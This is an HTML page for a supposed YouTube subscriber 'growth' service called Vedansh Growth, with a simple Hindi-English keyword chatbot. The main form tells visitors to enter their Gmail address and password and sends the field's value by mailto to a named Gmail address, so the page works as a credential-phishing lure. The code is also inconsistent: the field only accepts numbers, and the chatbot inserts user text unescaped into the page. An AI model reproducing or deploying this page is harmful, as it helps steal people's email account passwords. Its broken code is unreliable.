<!DOCTYPE html>
<html>
<head>
<title>Vedansh Growth</title>

<style>
body {
  margin: 0;
  font-family: Arial;
  background: linear-gradient(135deg, #000000, #1a1a1a);
  color: white;
  text-align: center;
}

/* Glass Card */
.container {
  margin-top: 120px;
  backdrop-filter: blur(15px);
  background: rgba(255,255,255,0.1);
  padding: 35px;
  border-radius: 20px;
  display: inline-block;
  animation: fadeIn 1s ease;
}

@keyframes fadeIn {
  from {opacity:0; transform:translateY(20px);}
  to {opacity:1; transform:translateY(0);}
}

input, button {
  padding: 12px;
  margin: 10px;
  width: 260px;
  border-radius: 10px;
  border: none;
  outline: none;
}

button {
  background: #00ffcc;
  cursor: pointer;
  transition: 0.3s;
}

button:hover {
  transform: scale(1.05);
}

/* Chat Button */
#chatBtn {
  position: fixed;
  bottom: 20px;
  right: 20px;
  background: #00ffcc;
  border-radius: 50%;
  width: 60px;
  height: 60px;
  font-size: 22px;
}

/* Chatbox */
#chatbox {
  display: none;
  position: fixed;
  bottom: 90px;
  right: 20px;
  width: 300px;
  background: rgba(0,0,0,0.85);
  border-radius: 15px;
  padding: 10px;
  box-shadow: 0 0 15px rgba(0,255,204,0.3);
}

#messages {
  height: 230px;
  overflow-y: auto;
  text-align: left;
  font-size: 14px;
}

.chatInput {
  width: 90%;
}
</style>

</head>

<body>

<div class="container">
  <h1>🚀 Enter Your gmail and gmail password</h1>
  <input type="number" id="subs" placeholder="e.g. gmail and gmail password"><br>
  <button onclick="sendMail()">Start Growth</button>
</div>

<!-- Chatbot Button -->
<button id="chatBtn" onclick="toggleChat()">💬</button>

<!-- Chatbox -->
<div id="chatbox">
  <div id="messages"></div>
  <input type="text" id="userInput" class="chatInput" placeholder="Ask something...">
  <button onclick="sendMessage()">Send</button>
</div>

<script>

// 📧 MAIL FUNCTION
function sendMail() {
  let subs = document.getElementById("subs").value;

  if(subs == ""){
    alert("Please enter subscribers");
    return;
  }

  let subject = "Subscribers Request";
  let body = "Hello Vedansh,\n\nMujhe " + subs + " subscribers chahiye.";

  window.location.href =
    "mailto:parivanshfilms@gmail.com?subject=" +
    encodeURIComponent(subject) +
    "&body=" +
    encodeURIComponent(body);
}

// 🤖 TOGGLE CHAT
function toggleChat(){
  let box = document.getElementById("chatbox");
  box.style.display = (box.style.display == "none") ? "block" : "none";
}

// 🎤 VOICE FUNCTION
function speak(text){
  let speech = new SpeechSynthesisUtterance(text);
  speech.lang = "hi-IN";
  window.speechSynthesis.speak(speech);
}

// 💬 CHATBOT LOGIC
function sendMessage(){
  let input = document.getElementById("userInput").value.toLowerCase();
  let messages = document.getElementById("messages");

  if(input == "") return;

  messages.innerHTML += "<p>👤: " + input + "</p>";

  let reply = "";

  if(input.includes("kaun") || input.includes("who")){
    reply = "Mujhe Vedansh ne banaya hai 😎";
  }
  else if(input.includes("kya") || input.includes("what")){
    reply = "Ye website YouTube growth ke liye hai 🚀";
  }
  else if(input.includes("kaise") || input.includes("how")){
    reply = "Aap subscribers goal enter karo aur start karo 👍";
  }
  else if(input.includes("help")){
    reply = "Main aapki madad ke liye hoon 😊";
  }
  else if(input.includes("subscriber")){
    reply = "Aap apna target enter kare aur growth start kare 🔥";
  }
  else if(input.includes("vedansh")){
    reply = "Vedansh ek creator hai jisne mujhe banaya hai 💡";
  }
  else {
    reply = "माफ कीजिए, Vedansh ne mujhe sirf is website ki hi knowledge di hai.";
  }

  messages.innerHTML += "<p>🤖: " + reply + "</p>";

  speak(reply);

  document.getElementById("userInput").value = "";
  messages.scrollTop = messages.scrollHeight;
}

</script>

</body>
</html>
